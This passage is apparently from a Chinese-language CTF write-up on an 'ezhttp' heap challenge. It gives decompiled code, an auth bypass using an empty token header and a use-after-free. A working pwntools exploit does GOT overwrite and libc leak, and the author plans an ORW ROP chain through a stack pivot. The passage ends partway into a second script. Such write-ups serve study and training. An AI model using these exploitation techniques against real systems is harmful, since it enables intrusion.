<span class="number">8</span>;</span><br><span class="line">  token = <span class="built_in">strstr</span>(a1, <span class="string">&quot;token: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 || !token )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  __isoc99_sscanf(v4, <span class="string">&quot;%10[^=]=%80s&quot;</span>, &amp;s, &amp;u, v1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">7</span>; token[i] != <span class="string">&#x27;\r&#x27;</span>; ++i )</span><br><span class="line">    ;</span><br><span class="line">  token[i] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(&amp;s, <span class="string">&quot;user&quot;</span>, <span class="number">4u</span>LL) &amp;&amp; !<span class="built_in">strncmp</span>(&amp;u, <span class="string">&quot;admin&quot;</span>, <span class="number">5u</span>LL) )</span><br><span class="line">    result = <span class="built_in">strstr</span>(haystack, token + <span class="number">7</span>) != <span class="number">0L</span>L;<span class="comment">// check token</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;                               <span class="comment">// false</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>绕过方式:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=admin \r\n</span><br><span class="line">token: \r\n</span><br></pre></td></tr></table></figure>

<p>因为采用strstr进行判断的, 若传入字符串中为空, 那么这个就会返回haystack字符串中的末尾。haystack是一个随机字符串。</p>
<h3 id="vul"><a href="#vul" class="headerlink" title="vul"></a>vul</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">del</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  __isoc99_sscanf(a1, <span class="string">&quot;%10[^=]=%2s&quot;</span>, &amp;s, &amp;nptr, v1);</span><br><span class="line">  v3 = atoi(&amp;nptr);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(&amp;s, <span class="string">&quot;index&quot;</span>, <span class="number">5u</span>LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    send_to((__int64)<span class="string">&quot;HTTP/1.1 404 Not Found&quot;</span>, (__int64)<span class="string">&quot;No!You can&#x27;t&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt; <span class="number">15</span> || !p_addr[<span class="number">2</span> * v3] )</span><br><span class="line">  &#123;</span><br><span class="line">    send_to((__int64)<span class="string">&quot;HTTP/1.1 404 Not Found&quot;</span>, (__int64)<span class="string">&quot;No!You can&#x27;t&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(p_addr[<span class="number">2</span> * v3]);                         <span class="comment">// uaf</span></span><br><span class="line">  p_addr[<span class="number">2</span> * v3 + <span class="number">1</span>] = <span class="number">0L</span>L;</span><br><span class="line">  send_to((__int64)<span class="string">&quot;HTTP/1.1 200 OK&quot;</span>, (__int64)<span class="string">&quot;Delete success!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在一个uaf漏洞, 指针没有清0, 且在编辑中只对指针进行判断, 直接可以编辑使用后的函数.</p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>今天我在调试的时候吧alsr关了, 导致heap与elf地址发生连续, 我就以为给的heap地址可以泄漏elf地址, 打入ptr_addr然后修改free为puts打印atoi泄漏libc, 然后再次泄漏Libc中environ泄漏堆栈, 再次打入堆栈中布置row, 原来是我想多了, 若elf与heap连续的话采用此方法还行, 不连续的话就类似与爆破了, 但是今天我尝试了好多次, 也泄漏了远程libc,,只需再次弄后面的就行。爆破几率有点低, 通过以下已知</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x560c0c492000     0x560c0c495000 r-xp     3000 0      /home/xh/pwn2/ezhttp.o</span><br><span class="line">    0x560c0c694000     0x560c0c695000 r--p     1000 2000   /home/xh/pwn2/ezhttp.o</span><br><span class="line">    0x560c0c695000     0x560c0c696000 rw-p     1000 3000   /home/xh/pwn2/ezhttp.o</span><br><span class="line">    0x560c0c97d000     0x560c0c99e000 rw-p    21000 0      [heap]</span><br><span class="line">    0x7f1898273000     0x7f189845a000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7f189845a000     0x7f189865a000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7f189865a000     0x7f189865e000 r--p     4000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br><span class="line">    0x7f189865e000     0x7f1898660000 rw-p     2000 1eb000 /lib/x86_64-linux-gnu/libc-2.27.so</span><br></pre></td></tr></table></figure>

<p>爆破几率为 1 / 4096, 今天索性有一次泄漏, 那是万幸…</p>
<p>坑点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size = <span class="built_in">strlen</span>(&amp;src);</span><br><span class="line"><span class="built_in">strncpy</span>(p_addr[<span class="number">2</span> * i], &amp;src, size);</span><br></pre></td></tr></table></figure>

<p>开辟的大小需要由字符串来决定,payload中就不能出现<code>\x00</code>了</p>
<p>把今天有一次泄漏libc的exp先贴着.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author: i0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;ezhttp.o&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;183.129.189.62&quot;</span></span><br><span class="line">server_port = <span class="number">62002</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">d</span>):</span></span><br><span class="line">	print(d)</span><br><span class="line">	p =  <span class="string">b&#x27;POST /create HTTP/1.1 \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;Cookie: user=admin \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;token: \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;content=&#x27;</span></span><br><span class="line">	p += d</span><br><span class="line">	sa(<span class="string">&#x27;======= Send Http packet to me: ========\n&#x27;</span>, p)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">i</span>):</span></span><br><span class="line">	p =  <span class="string">b&#x27;POST /del HTTP/1.1 \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;Cookie: user=admin \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;token: \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;index=&#x27;</span> + <span class="built_in">str</span>(i).encode()</span><br><span class="line">	sa(<span class="string">&#x27;======= Send Http packet to me: ========\n&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">i, d</span>):</span></span><br><span class="line">	p =  <span class="string">b&#x27;POST /edit HTTP/1.1 \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;Cookie: user=admin \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;token: \r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">	p += <span class="string">b&#x27;index=&#x27;</span> + <span class="built_in">str</span>(i).encode()</span><br><span class="line">	p += <span class="string">b&#x27;&amp;content=&#x27;</span> + d + <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">	sa(<span class="string">&#x27;======= Send Http packet to me: ========\n&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	ad(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span>) <span class="comment"># 0</span></span><br><span class="line">	ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">	leak = <span class="built_in">int</span>(ru(<span class="string">&#x27;&quot;&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">	db()</span><br><span class="line">	offset = <span class="number">0</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		offset =  <span class="number">0x555555758260</span> - <span class="number">0x555555554000</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		offset =  <span class="number">0x202260</span></span><br><span class="line">		offset =  <span class="number">0x201260</span></span><br><span class="line">	li(<span class="string">&#x27;offset: &#x27;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">	elf_base = leak - offset</span><br><span class="line">	p_addr = elf_base + <span class="number">0x203120</span></span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	li(<span class="string">&#x27;elf_base: &#x27;</span> + <span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	li(<span class="string">&#x27;attack to p_addr&#x27;</span>)	</span><br><span class="line">	<span class="comment"># attack to p_addr + 0x10 set chunk 1 -&gt; free_got</span></span><br><span class="line">	ad(p64(p_addr + <span class="number">0x10</span>)) <span class="comment"># 1</span></span><br><span class="line">	ad(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span>) <span class="comment"># 2</span></span><br><span class="line">	free_got = elf_base + elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;free_got: &#x27;</span> + <span class="built_in">hex</span>(free_got))</span><br><span class="line"></span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	ad(p64(free_got)) <span class="comment"># 3</span></span><br><span class="line">	li(<span class="string">&#x27;p_addr: &#x27;</span> + <span class="built_in">hex</span>(p_addr))</span><br><span class="line">	</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	rm(<span class="number">0</span>)</span><br><span class="line">	li(<span class="string">&#x27;modify free_got as puts plt&#x27;</span>)</span><br><span class="line">	md(<span class="number">1</span>, p64(elf_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>])[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">	li(<span class="string">&#x27;attack to p_addr set chunk2 as atoi got&#x27;</span>)</span><br><span class="line">	ad(p64(p_addr + <span class="number">0x20</span>)) <span class="comment"># 1</span></span><br><span class="line">	ad(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x8</span>) <span class="comment"># 2</span></span><br><span class="line">	ad(p64(elf_base + elf.got[<span class="string">&#x27;atoi&#x27;</span>])) <span class="comment"># 3</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># leak libc</span></span><br><span class="line">	li(<span class="string">&#x27;puts libc&#x27;</span>)</span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	libc_base = leak - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;libc_atoi: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">	environ = libc_base + libc.sym[<span class="string">&#x27;_environ&#x27;</span>]</span><br><span class="line">	li(<span class="string">&#x27;environ: &#x27;</span> + <span class="built_in">hex</span>(environ))</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># leak stack</span></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	db()</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process()</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>太菜了….</p>
<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>基于以上泄漏, 我们先泄漏通过environ泄漏stack的input地址, 通过修改exit的的got表中的地址实现劫持, 但是程序开了沙箱, 只能采用orw来打, 比较麻烦的是, 采用开辟堆来实现, 那也不行, 有特殊字符截断,  只能在堆栈中构造rop链,  我在libc中找了好久, 还有调了好久, 才找到一个方法实现….太菜了….</p>
<p>如何在堆栈中构造rop链并触发.</p>
<ol>
<li><p>首先我们先看下程序.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *cont; <span class="comment">// [rsp+8h] [rbp-1838h]</span></span><br><span class="line">  <span class="keyword">char</span> method; <span class="comment">// [rsp+10h] [rbp-1830h]</span></span><br><span class="line">  <span class="keyword">char</span> url; <span class="comment">// [rsp+20h] [rbp-1820h]</span></span><br><span class="line">  <span class="keyword">char</span> content; <span class="comment">// [rsp+30h] [rbp-1810h]</span></span><br><span class="line">  <span class="keyword">char</span> input; <span class="comment">// [rsp+830h] [rbp-1010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+1838h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_DF0();</span><br><span class="line">  sub_E4B();</span><br><span class="line">  sandbox();</span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( True )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n======= Send Http packet to me: ========&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;input, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, &amp;input, <span class="number">0x1000</span>uLL) &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Server error!&quot;</span>);</span><br><span class="line">    __isoc99_sscanf((__int64)&amp;input, (__int64)<span class="string">&quot;%s %s %s&quot;</span>, (__int64)&amp;method, (__int64)&amp;url, (__int64)&amp;content);</span><br><span class="line">    cont = get_end(&amp;input);                     <span class="comment">// cont -&gt; input-&gt;end</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;method, <span class="string">&quot;GET&quot;</span>) &amp;&amp; <span class="built_in">strcmp</span>(&amp;method, <span class="string">&quot;POST&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      send_to((__int64)<span class="string">&quot;HTTP/1.1 405 Method Not Allowed&quot;</span>, (__int64)<span class="string">&quot;Method not allowed&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>



</li>
</ol>
<p>可以看到, 我们输入前部分可以放到method变量地方, 而这个变量可以储存0x10个字符, 若想利用rop, 我们前提是要到控制好rsp在我们的rop上, 那怎么才能控制rsp, 在libc中通过某些指令构造,比如通过pop rsp ret指令,那如何布置该指令呢, 使用该指令控制rsp，必须符合如下结构:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop_rsp_ret addr</span><br><span class="line">target_rsp addr</span><br></pre></td></tr></table></figure>

<p>首先, 我们必须至少控制两个地址连续的地址,且ret时指向pop_rsp_ret  addr, 这样执行pop rsp指令时会将rsp指向我们的rop链中.</p>
<p>也可以采用leave ret指令修改也行, 但是我们得控制rbp, rbp可以采用pop rbp … ret控制.</p>
<p>那我就采用pop rsp来使我们劫持的exit 函数指向我们的 rop链中, 而rop链也就是我们所输入的堆栈地址那.</p>
<p>与method变量结合.</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------| </span><br><span class="line">unuse                              rsp,        we can modify it</span><br><span class="line">----------------------------------|</span><br><span class="line">unuse</span><br><span class="line">----------------------------------|</span><br><span class="line">unuse</span><br><span class="line">----------------------------------| </span><br><span class="line">pop rsp addr in libc                method    we can modify it</span><br><span class="line">-----------------------------------</span><br><span class="line">addr our input rop chain in stack |           we can modify it</span><br></pre></td></tr></table></figure>

<p>我们先劫持exit函数为main函数中的所输入的地方, 也就是read函数那, 这样就可以实现循环输入到堆栈中而不退出,。先输入 method + 0x8部分, 这样做是因为前面字符不能有’\x00’截断,我们可以让这个地址设为我们即将要改变rsp指向为我们所输入的rop chain地址,但是我们会面临一个问题, 就是我们输入pop_rsp_ret指令的地址后, 跳到这个地方, 高位地址有我们之前输入的字符, 需要不断缩小来设置为’\x00’。通过这个构造, 再次修改 exit got表中的值为 我们所够造好的rop, 修改为pop3_ret, 弹掉3个没用变量, 修改rsp为我们的rop链, 在ret到我们的rop chain中, 这样就可以完美利用了。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 